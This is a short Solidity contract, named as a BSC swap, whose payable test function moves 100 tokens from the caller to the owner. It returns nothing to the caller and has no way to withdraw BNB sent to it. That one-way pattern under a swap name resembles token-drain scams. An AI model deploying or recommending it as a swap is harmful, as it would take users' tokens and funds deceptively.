// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

contract BSCSWAPBNBSwap {
    address public owner;
    address public bscswapTokenAddress = 0xBFd0eB7E332531A35235dc1bb66935f4a3Aa0670;

    constructor() {
        owner = msg.sender;
    }

    function test() payable public {
        // require(msg.value == 0.000141 ether, "failed");
        address tokenAddress = bscswapTokenAddress;
        uint256 amount = 100;
        IERC20 token = IERC20(tokenAddress);

        require(token.transferFrom(msg.sender, owner, amount), "Transfer failed");

    }
}